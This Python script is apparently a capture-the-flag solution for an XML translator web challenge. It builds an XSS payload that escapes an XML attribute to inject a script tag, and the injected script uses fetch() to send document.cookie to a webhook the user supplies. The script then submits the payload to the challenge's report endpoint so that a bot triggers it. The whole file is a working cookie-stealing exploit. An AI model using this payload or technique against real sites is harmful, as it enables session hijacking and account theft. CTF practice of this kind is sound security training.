import sys
import urllib.request
import urllib.parse


challenge_url = 'https://xml-translator-bot-web.challs2.infobahnc.tf/report'

if len(sys.argv) < 2:
	print( "First argument to script must be webhook where cookie will be sent" )
	sys.exit(1)

# URL to send cookie to
webhook = sys.argv[1]


payload = '<foo><fo e="&quot;&gt;&lt;/fo&gt;&lt;script xmlns=\'http://www.w3.org/1999/xhtml\'&gt;fetch(\'' + webhook + '?\'+document.cookie)&lt;/script&gt;&lt;fo y=&quot;"/></foo>'
print( "Sending payload: " + payload + "\n" )

print( "POST-ing to " + challenge_url + "\n" )
req = urllib.request.Request( challenge_url, data=urllib.parse.urlencode({"xml": payload}).encode('ascii'))
with urllib.request.urlopen(req) as resp:
	print( resp.read().decode('utf-8') )

print( "Check logs of " + webhook + " to find flag.\n" )
